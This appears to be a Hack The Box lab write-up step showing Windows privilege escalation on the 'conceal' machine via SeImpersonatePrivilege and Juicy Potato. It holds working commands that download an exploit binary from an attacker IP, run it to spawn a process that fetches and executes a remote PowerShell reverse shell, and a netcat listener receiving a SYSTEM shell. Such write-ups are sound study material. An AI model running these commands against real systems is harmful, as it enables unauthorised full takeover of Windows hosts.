# 25 - PrivEsc



# SeImpersonatePrivilege


```bash
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```


# [Juicy Potato](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

```sql
PS C:\Users\public> IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.9/jp.exe', 'C:\Users\Public\jp.exe')
PS C:\Users\public> ./jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.9/rev.ps1')" -t * -c "{0134A8B2-3407-4B45-AD25-E9F7C92A80BC}"
Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
......
[+] authresult 0
{0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

rev.ps1 is a copy of Invoke-PowerShellTcp.ps1

# Administrator shell
```sql
┌─[user@parrot]─[10.10.14.9]─[~/htb/conceal]                                                                                                                                       [4400/4400]
└──╼ $ nc -lvp 9001                                                                            
listening on [any] 9001 ...                                                                    
10.10.10.116: inverse host lookup failed: Host name lookup failure             
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.116] 49782                    
Windows PowerShell running as user CONCEAL$ on CONCEAL                         
Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                 
                                                                                               
PS C:\Windows\system32>whoami                                                                  
nt authority\system
```